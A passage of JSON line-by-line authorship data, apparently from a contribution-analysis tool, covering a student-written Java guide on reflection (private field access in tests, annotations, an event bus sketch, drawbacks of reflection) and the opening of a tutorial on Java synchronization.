      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "And there you have it! What `Sheep` is really doing is to examine itself at runtime in order to obtain the `age` field inherited from `Animal`. This technique can be used in test cases to access private fields and methods in the class under test without modifying the visibility modifiers of the fields and methods in the class itself."
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "You may notice that the `Sheep#getAge()` method sets the age `Field` object to be accessible and might wonder the implications. Fret not! The `Field#getDeclaredField()` actually returns a new `Field` instance - so you\u0027re just setting that particular local `Field` instance to be accessible, not the actual `age` field itself. You can read more about it in this [StackOverflow question](https://stackoverflow.com/questions/10638826/java-reflection-impact-of-setaccessibletrue)."
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "Do take note that two exceptions need to be handled when accessing fields: "
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "1. `IllegalAccessException`, which occurs if the field is private and you did not set the accessibility modifier to be true (e.g. `f.setAccessible(true)`)."
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "1. `NoSuchFieldException`, which occurs if the field with the specified name (e.g. `age`) does not exist."
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Updating Private Fields"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "Suppose that you need to write tests for `Sheep`. As part of setting up the test, you need to create a sheep with age \u003d 20. Suppose that the age of the sheep is updated automatically as time passes, whereby the age increases by 1 after every minute. A naive way of creating a sheep with age \u003d 20 is to simply wait for 20 minutes before performing the test:"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "@Test"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "public void foo() throws Exception {"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "  Sheep sheep \u003d new Sheep();"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "  TimeUnit.MINUTES.sleep(20);"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "  // perform test"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "Alternatively, a much simpler and efficient way to perform this test is to set a value to the private field using Reflection:"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "@Test"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "public void foo() throws Exception {"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "  Sheep sheep \u003d new Sheep();"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "  Field field \u003d Animal.class.getDeclaredField(\"age\");"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "  field.setAccessible(true);"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "  field.set(sheep, 20);"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "  // perform test"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Testing Private Methods"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "Suppose you want to perform a unit test for the method `getAge()`. However, you are only able to indirectly do so by testing `isProducingWool()`. This is not good as we are not able to directly verify the age of a sheep. However, with the help of Reflection, we can now test private methods."
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "@Test"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "public void foo() throws Exception {"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "  Sheep sheep \u003d new Sheep();"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "  Method method \u003d Sheep.class.getDeclaredMethod(\"getAge\");"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "  method.setAccessible(true);"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "  int age \u003d (int) method.invoke(sheep);"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "  // verify age"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### A More Advanced Application"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "You might have learnt from your Software Engineering module that the Observer pattern can be used for objects that are interested to get notified if the state of another object is changed. The Observer pattern is useful because you can avoid creating bidirectional dependencies between two unrelated objects that have no business talking to each other while allowing the objects to be notified of any changes in another object."
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "One prime example of the implementation of the Observer pattern is the Google Events bus used in [AddressBook Level 4](https://github.com/se-edu/addressbook-level4/). The event bus uses reflections to observe all registered objects via `register` method for methods annotated with the `Subscribe` annotation."
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "An example implementation (not the actual) of the `Subscribe` annotation might be:"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "@Retention(RetentionPolicy.RUNTIME) // Retain this annotation at runtime!"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "@Target(ElementType.METHOD) // Only can be applied to methods!"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "public @interface Subscribe { }"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "And that is it! Important parts of the code to note are the first two lines before the declaration. The first line tells Java that this annotation must not be discarded during compile time so it will be available during runtime. The retention policy is there because some annotation do not mean anything after compilation (such as `Override` and `SuppressWarnings`), so it does not make sense to keep the annotation after compiling."
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "The second line just means that this annotation can be applied to methods only."
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "And the more important part is how the subscriber registry finds all its subscribing methods. The first step is to register a class as an event handler and an example of the code is like so:"
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "public class Sheep extends Animal {"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "  private static final EventsCenter EVENTS_BUS \u003d EventsCenter.getInstance();"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "  public Sheep() {"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "    super();"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "    EVENTS_BUS.register(this.getClass());"
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "  @Subscribe"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": "  public void handleWeatherChangeEvent(WeatherChangeEvent event) {"
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "    if (event.weather \u003d\u003d Weather.RAIN) {"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": "      hide();"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": "  ..."
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "An example implementation of the `EventsCenter` (with a lot of details left out for simplicity) is like so:"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": "public void register(Class\u003c?\u003e clazz) {"
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "  findAllEventHandlersInClass(clazz);"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": "public void findAllEventHandlersInClass(Class\u003c?\u003e clazz) {"
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "  // TypeToken class is provided by Google Guava reflection library"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": "  Set\u003c? extends Class\u003c?\u003e\u003e supertypes \u003d TypeToken.of(clazz).getTypes().rawTypes();"
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": "  for (Class\u003c?\u003e supertype : supertypes) {"
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": "    for (Method method : supertype.getDeclaredMethods()) {"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "      if (method.isAnnotationPresent(Subscribe.class) {"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": "        registerSubscriber(method);"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "-"
        },
        "content": "      }"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": "The first line of the `findAllEventHandlersInClass` method finds all classes and its parent classes of the registered class and converts it to a set. That is if you registered `Sheep extends Animal` as an event handler to the method, both `Sheep` and `Animal` will be captured by the first line. The following lines will then examine all their methods (during runtime!) for the `Subscribe` annotation and register the method so that it will receive the specified event when it is fired. Of course this implementation leaves out a lot of details but you get the idea of how Java reflections works."
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Disadvantages of Reflections"
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "-"
        },
        "content": "While Java reflections are powerful, you should not immediately jump on the reflections ship. This is because there are some drawbacks whenever you use reflections in your project. The following are some points you should consider before using Java reflections:"
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "-"
        },
        "content": "* Reflections convert a compile-time error to a potentially destructive run-time error."
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "-"
        },
        "content": "  Compile time errors are easy to catch. Whenever you compile your code, the compiler cleverly spots any error you missed and points it out (along with line number and other useful information) to you before quitting. But by using reflections, you are bypassing these checks because there is no way to check such errors during compile time. These uncaught errors may cause your program to fail during runtime instead, turning into runtime errors."
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "-"
        },
        "content": "  For example you might have come across this problem where your program crashed and you get a `NullPointerException` error in your crash log. As you might have experienced already, runtime errors are more troublesome in that they are harder to catch and debug. They might even bring your whole software under the water with it by crashing the whole thing."
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "-"
        },
        "content": "* Reflections are harder to understand and harder to debug"
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "-"
        },
        "content": "  There is a reason why the topic of reflections is placed under the advanced section. Codes using reflections are fundamentally harder to understand. As mentioned above, it is also harder to debug when the classes might not even be there during compile time. This makes your code very hard to maintain."
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "-"
        },
        "content": "* Poor performance"
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "-"
        },
        "content": "  Since reflections resolve types dynamically, performance suffers. This is usually not an issue with small software but you might want to keep it in mind if you want to scale up."
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "-"
        },
        "content": "* Bad Security"
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "-"
        },
        "content": "  The second example demostrated a way to access the private fields of a class using reflections. This should be very concerning if your software deals with sensitive information because other classes can access fields that they are not supposed to."
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "-"
        },
        "content": "* Indication of bad class design"
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "-"
        },
        "content": "  Having to use reflection in order to bypass a class\u0027 encapsulation is usually indicative of an API design problem. We can remove the usage of Reflection in the examples given [above](#accessing-private-fields) by adding a getter and setter method for `age`. See this [post](https://stackoverflow.com/questions/34571/how-do-i-test-a-private-function-or-a-class-that-has-private-methods-fields-or/34658#34658) for further discussion. In this scenario whereby we cannot add a getter and setter method for `age`, we should create our own implementation of `Animal` class with the getter and setter methods."
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Further Resources for Reflections"
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 276,
        "author": {
          "gitId": "-"
        },
        "content": "* Introductions to Java reflections with some explanation"
      },
      {
        "lineNumber": 277,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 278,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "  [https://www.javaworld.com/article/2077015/java-se/take-an-in-depth-look-at-the-java-reflection-api.html](https://www.javaworld.com/article/2077015/java-se/take-an-in-depth-look-at-the-java-reflection-api.html)"
      },
      {
        "lineNumber": 279,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "  [https://www.journaldev.com/1789/java-reflection-example-tutorial](https://www.journaldev.com/1789/java-reflection-example-tutorial)"
      },
      {
        "lineNumber": 280,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 281,
        "author": {
          "gitId": "-"
        },
        "content": "* A short but precise overview of Java reflections"
      },
      {
        "lineNumber": 282,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 283,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "  [https://www.oracle.com/technetwork/articles/java/javareflection-1536171.html](https://www.oracle.com/technetwork/articles/java/javareflection-1536171.html)"
      },
      {
        "lineNumber": 284,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 285,
        "author": {
          "gitId": "-"
        },
        "content": "* Google\u0027s Guava reflection library provides some utility methods and classes "
      },
      {
        "lineNumber": 286,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 287,
        "author": {
          "gitId": "-"
        },
        "content": "  [https://github.com/google/guava/wiki/ReflectionExplained](https://github.com/google/guava/wiki/ReflectionExplained)"
      },
      {
        "lineNumber": 288,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 289,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 290,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 291,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 7,
      "jamessspanggg": 5,
      "iskandarzulkarnaien": 16,
      "-": 263
    }
  },
  {
    "path": "contents/java/JavaSynchronization.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Java Synchronization"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Java Synchronization"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Boxin](https://github.com/boxin-yang)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Introduction](#introduction)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Basic Syntax](#basic-syntax)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Synchronized Statement](#synchronized-statement)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Synchronized Method](#synchronized-method)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [More Features of Java Synchronization](#more-features-of-java-synchronization)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [wait() and notifyAll()](#wait-and-notifyall)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Understand Which Object is Used as Monitor](#understand-which-object-is-used-as-monitor)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Check Condition for wait() with While Loop](#check-condition-for-wait-with-while-loop)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Breakpoint of notifyAll()](#breakpoint-of-notifyall)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [notify()](#notify)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Related Areas](#related-areas)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "Java Synchronization is the Java implementation of [Monitor][1]. The Monitor is used with [parallel threads][2] to ensure [mutual exclusion][3] in [critical section][4]. It is a mechanism to ensure [thread safety][5] when parallel threads are accessing shared data of an object."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "Java builds Monitor into [Java Object][6] and each object is itself a Monitor. Although Java has also implemented other mechanisms such as [Semaphore][7] in Java 5, Java Monitor is more widely used since it is supported in the first version of Java. In this tutorial, we will go through Java Synchronization in terms of basic syntax, useful features and best practice."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "# Basic Syntax"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "Java Synchronization is done by using keyword **synchronized**. It is commonly used in two forms: *synchronized statement* and *synchronized method*. We will use example codes to illustrate how synchronized keyword is used."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Synchronized Statement"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "Let us look at the following code snippet to understand synchronized statement:"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "synchronized(object) {"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "\t// critical section"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "The **synchronized** keyword takes in an **object** as an argument and uses brackets to enclose the **critical section** that accesses object data. In the code above, the **object** argument is the object to be used as the Monitor. When **critical section** is executed, the **object Monitor** locks all data of the object and only the **critical section**in the synchronized block can access data of the **object**. When the execution of **critical section** finishes on a certain thread, the thread gives up the **object Monitor** lock and other threads can access the data of **object**. Therefore, as long as **critical section** is included in a synchronized block of a **object Monitor**, data of the object is guaranteed to be thread safe."
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Synchronized Method"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "Another common way to use **synchronized** functionality is called **synchronized method**. The following code snippet is an example."
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "public synchronized void foo() {"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "\t// method code"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "In this example, **synchronized** is used as a method modifier to indicate that the method is synchronized. In the case of a synchronized method, all the content in the method is considered as **critical section** and the Monitor object used is dependent on the method. If the method is an instance method, then the Monitor object used is **this** instance. If the method is a class method, then the Monitor object used is a special class object initialized during run time for each class. The equivalence of the above code is:"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "public void foo() {"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "\tsynchronized(this) {"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "\t\t// method code"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "\t}"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "# More Features of Java Synchronization"
      },
